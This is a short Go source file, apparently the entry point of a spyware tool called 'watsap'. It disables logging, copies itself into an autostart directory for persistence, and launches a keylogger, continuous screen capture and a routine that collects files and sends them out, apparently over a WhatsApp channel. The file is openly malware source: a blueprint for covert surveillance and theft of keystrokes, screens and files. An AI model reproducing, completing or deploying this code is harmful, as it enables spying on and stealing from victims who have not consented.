package main

import (
	"watsap/plugins/files"
	"watsap/plugins/keylog"
	"watsap/plugins/screen"
	"watsap/utils"
	"watsap/utils/config"
	"watsap/utils/messages"
	"watsap/utils/secure"
	"watsap/utils/wainit"
)

func init() {
	config.DebugMode = false
	config.WaLogging = false
}

func main() {
	secure.SSLPinning()          // ssl pinning
	wainit.InitWa()              // initialize watsap
	messages.StartupMessage1()   // send init message
	go utils.CopySelfToTempDir() // copy self to autostart dir
	go files.InitFiles()         // initialize files
	go files.CheckAndSendFiles() // check and send files
	go keylog.InitKeylog()       // initialize keylogger
	go screen.LoopScreen()       // loop screen capture
	select {}                    // wait forever
}
